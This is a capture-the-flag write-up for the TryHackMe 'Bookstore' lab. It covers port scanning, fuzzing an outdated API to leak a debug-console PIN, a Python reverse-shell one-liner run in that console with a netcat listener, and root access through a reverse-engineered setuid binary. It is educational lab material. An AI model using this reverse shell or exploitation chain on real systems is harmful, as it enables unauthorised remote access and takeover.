# BookStore
This is a CTF write-up part of the TryHackMe box called the bookstore

The first thing to do when enumerating a target is to look at what's open for access so I decided to do a Nmap scan on the target IP address

![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/300d8374-5dd3-4888-8ffc-c40290430d6a)

I've found that port 80 which indicates a web page, and port 5000 is open so I decided to check it

![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/b26051f7-ab73-477b-a695-881e1e40ad16)

I found that they are using a Foxy REST API v2.0 which would indicate an outdated version

When checking the source code for the login page I also found this in the source code
![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/7d429ec1-7e19-4f9c-afbe-d681de0b2c0f)

This was an indicator that there's a file called bash_history which would include a pin that might be viable down the line

After that, I enumerated the web address with port 5000 to find anything that might be of use and found the following
![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/4ee94a74-d31c-4d8e-a326-98d9f22c18f7)

The robots.txt file didn't have anything interesting, just a prevention so web crawlers won't be able to find the /api 
whoever I was able to find a /console that took me to a page that asked for a PIN, the PIN mentioned earlier could be used for it
within the /api I was able to find the following
![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/a107652a-af37-437a-a828-8d209bd0cfdb)

So I decided to use the old version of the API and see if I could find any left-behind files that could be of use
I used wfuzz to look for where the bash_history file might be at

```shell wfuzz https://IP:5000/api/v1/resources/books?FUZZ=.bash_history --hc 404 -w /usr/share/wordlist/dirbs/common.txt```

and got the following results

![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/c2b0a714-836c-4c06-a7a1-484c78bb15aa)

the only payload that returned a JSON file was "show" which returned the following

![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/0ffa5c0f-b0b2-4bdc-998a-9b3bb953684f)

now that we got the PIN, let's use it to access the console

![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/4b9009a3-6351-42f3-96f8-9b205d78eb1f)

looks like we have a Python interactive console, so let's use a Python payload to initiate a reverse shell

```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

used this cheatsheet https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master

before importing the payload into the console I opened a netcat on port 1234 
```shell
nc -lvnp 1234
```

after which I was able to login into the shell and found the user.txt file which was the first flag
![edited usertxt](https://github.com/achrafelkhatib/BookStore/assets/61394291/2a553a2d-c99a-454d-bbf7-77632a0858a9)

now for privilege escalation, i first looked at what files are in sid's directory and found the following
![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/dd2ad76e-cc3f-441c-a5a1-b04f4bad935d)

the try-harder file can be executed as indicated by the x and it's owned by the root user within the group sid, which means we can run as sid as well and might be our 
gateway into being a root, however upon running it, it was asking for a magic number, so I decided to reverse engineer the binary file in order to see its contents and found
the following

![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/e85ab127-fbd4-4187-bf28-ebe355c633bc)

now we have the code and the magic number however we need to do some calculations in order to find the full number, so in Python I did the following

![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/7e10926b-7ed3-4def-8b58-21ae79cb86fa)

now that we have the magic number let's try running the script again and see what happens

![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/f39037a4-2750-42f1-96fb-e2d568dcb232)

looks like now we are root, so on the hunt for the root.txt file which was found in the root directory under /root/root.txt 

![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/cda7dd45-1872-4613-96cf-c13b7b10404b)

now all we got to do is cat the file for the hex flag.
